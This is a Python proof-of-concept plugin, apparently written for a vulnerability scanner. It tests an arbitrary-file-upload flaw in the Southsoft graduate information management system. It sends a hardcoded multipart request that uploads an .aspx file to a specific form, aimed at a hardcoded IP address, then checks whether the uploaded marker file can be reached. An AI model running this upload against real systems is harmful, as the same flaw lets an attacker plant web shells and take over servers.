#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:xq17
#Name:南软研究生信息管理系统任意上传
#Refer:http://www.wooyun.org/whitehats/岩少/type/1/page/2

def assign(service,arg):
    if service=="southsoft":
        return True,arg 
    
def  audit(arg):
    raw1= '''
POST /gmis/zs/sczgscbInfoAdd.aspx HTTP/1.1
Host: 211.64.205.214
Proxy-Connection: keep-alive
Content-Length: 818
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: http://211.64.205.214
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Referer: http://211.64.205.214/gmis/zs/sczgscbInfoAdd.aspx
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: ASP.NET_SessionId=zy2rsy45ry0s2ljybsavbm55

------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="__EVENTTARGET"

cmdAdd
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="__EVENTARGUMENT"


------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="__VIEWSTATE"

dDwxNjY1MTUyNzEzO3Q8O2w8aTwxPjs+O2w8dDxwPGw8ZW5jdHlwZTs+O2w8bXVsdGlwYXJ0L2Zvcm0tZGF0YTs+Pjs7Pjs+Pjs+mHDOaNHdqKcabGLklJcaRVdON64=
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="txtMC"

testvul
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="myFile"; filename="xq17.aspx"
Content-Type: application/xml

testvul
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG
Content-Disposition: form-data; name="txtBZ"

testvul
------WebKitFormBoundaryNNHfzqBMQ1CNoTfG--


 '''
    url = arg+ 'gmis/zs/sczgscbInfoAdd.aspx'
    payload=arg+'gmis/ZS/uploadfiles/xq17.aspx'
    code, head, res, errcode, _ = curl.curl2(url,raw=raw1)
    code1, head, res, errcode, _ = curl.curl2(payload)
    if code1 ==200 and 'testvul' in res:
        security_hole(payload)


if __name__ == '__main__': 
    from dummy import *
    audit(assign('southsoft','http://211.64.205.214/')[1])